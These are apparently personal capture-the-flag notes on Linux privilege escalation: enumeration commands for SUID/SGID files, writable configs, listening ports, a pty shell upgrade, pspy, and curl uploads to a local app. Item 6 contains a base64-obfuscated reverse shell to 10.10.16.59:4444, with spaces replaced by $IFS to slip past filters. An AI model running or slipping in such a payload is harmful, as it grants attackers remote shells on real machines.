
# Privilege Escalation
1. https://computingforgeeks.com/linux-privilege-escalation-guide-kali/#google_vignette
2. https://gtfobins.org/
3. abuse sudo
4. ss -tlnp
5. writeable config find /etc -writable 2>/dev/null 
5. avoid proccess quit 
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
6. a reverse shell can use $IFS to without space
echo$IFS"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41OS80NDQ0IDA+JjEK"|base64$IFS-d|bash

7. find / -perm -2000 -type f 2>/dev/null  #sgid
find / -perm -4000 -type f 2>/dev/null  #suid

8. dpkg -l | wc -l

9. curl with cookie -c save cookie -b send cookie
```
curl -s -c /tmp/cj -b /tmp/cj -F "action=upload_contract" \
  -F "contract_file=@/home/walter/test.json;type=application/json" \
  http://127.0.0.1:5000/dashboard

curl -s -c /tmp/cj -b /tmp/cj -d "action=contract_claim" \
  http://127.0.0.1:5000/dashboard
```

10. pspy https://github.com/DominicBreuker/pspy  
pspy64 -pf -i 1000